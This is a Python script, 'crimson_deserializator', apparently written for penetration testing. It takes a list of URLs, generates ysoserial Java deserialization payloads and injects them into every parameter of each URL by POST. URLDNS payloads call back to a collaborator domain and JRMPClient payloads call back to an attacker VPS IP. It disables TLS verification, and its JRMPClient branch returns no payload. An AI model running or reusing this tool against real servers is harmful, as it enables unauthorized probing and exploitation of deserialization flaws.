# coding: utf-8
#
### CREATE BY KARMAZ
#
#
### TO DO:
# 1. ANALYZE RESPONSES: 
#   AAEAAAD/////
# 2. CREATE .NET PAYLOADS
# 3. ADD CUSTOM PORT
#
### FUNCTIONS:
# 0. CHANGE get TO post METHOD
# 1. CREATE URLDNS OR JRMPClient PAYLOAD FOR JAVA DESERIALIZATION
# 2. SEND PAYLOAD INTERCHANGEABLY IN EVERY PARAMETER VALUE
#       - URLDNS WITH url_id.domain_collab
#       - JRMPCLIENT WITH vps_ip:80
###

import sys
import time
import getopt
import urlparse
import requests
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
from IPy import IP
import base64, os, ssl
if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context
HOME = os.getenv('HOME')
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

### OPTIONS ---
full_cmd_arguments = sys.argv
argument_list = full_cmd_arguments[1:]
short_options = "l:i:d:H:"
long_options = ["list", "vps_ip", "domain_collab", "headers"]
try:
        arguments, values = getopt.getopt(argument_list, short_options, long_options)
except getopt.error as err:
        sys.exit(2)
### --- (They will be iterated at the bottom of the screen ---

def change_get_to_post(url):
    '''Transform 'https://url.com/a?query=x&b=qweqwe' to ('https://url.com/a', {'query': 'x', 'b': 'qweqwe'})'''
    parsed=urlparse.urlparse(url)
    new_url=parsed.scheme + "://" + parsed.netloc + parsed.path
    data_to_post_dict=dict(urlparse.parse_qs(parsed.query))
    return new_url, data_to_post_dict

def generate_ysoserial(payload_id, ip_or_domain):
    '''Return URLDNS payload if ip_or_domain is a domain or JRMPClient payload if ip_or_domain is an ip addr'''
    try:
        IP(ip_or_domain)
        command = os.popen("java -jar $HOME/tools/ysoserial/ysoserial.jar JRMPClient '"+ip_or_domain+":80'")
        result = command.read()
        command.close()
        encoded = base64.b64encode(result)
        if encoded != "":
            return
    except:
        command = os.popen("java -jar $HOME/tools/ysoserial/ysoserial.jar URLDNS 'http://"+str(payload_id)+"."+ip_or_domain+"'")
        result = command.read()
        command.close()
        encoded = base64.b64encode(result)
        if encoded != "":
            return encoded

def send_payload(URL,payload,data_to_post, headers):
    '''Send ysoserial payload in every parameter value'''
    count_of_params = 0
    for key,value in data_to_post.iteritems():
        count_of_params += 1
    
    if count_of_params == 0:
        return
    elif count_of_params == 1:
        old_data = dict(data_to_post)
        data_to_post.update({data_to_post.keys()[0]:payload})
        r = requests.post(url=URL, data=data_to_post, headers=headers)
        data_to_post = dict(old_data)
    else:
        for key in data_to_post:
            old_data = dict(data_to_post)
            data_to_post.update({key:payload})
            r = requests.post(url=URL, data=data_to_post, headers=headers)
            data_to_post = dict(old_data)


### OPTIONS ---
headers = {}
for current_argument, current_value in arguments:
    if current_argument in ("-l", "--list"):
        list_of_urls = current_value
    elif current_argument in ("-i", "--vps_ip"):
        ip_or_domain = current_value
    elif current_argument in ("-d", "--domain_collab"):
        ip_or_domain = current_value
    elif current_argument in ("-H", "--headers"):
        print(current_value)
        #part_1 = current_value.split(":")[0]
        #part_2 = current_value.split(":")[1]
        #if part_2[0] == " ":
            #part_2 = part_2[1:]
        #headers.update({part_1:part_2})
### ---

try:
    with open(list_of_urls) as urls:
        payload_id = 1
        for url in urls:
            new_url, data_to_post = change_get_to_post(url.rstrip())
            payload = generate_ysoserial(payload_id, ip_or_domain)
            send_payload(new_url, payload, data_to_post, headers)
            payload_id += 1
except:
    print("""
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║   ██║██████╔╝
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║   ██║██╔══██╗
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝""")
    print("USAGE:")
    print("\t python crimson_deserializator")
    print("\t\t -l [list_of_urls]")
    print("\t\t -i [vps_ip] or -d [collaborator_domain]")
    print("\t\t -H [Cookie: x=1; y=2;]")

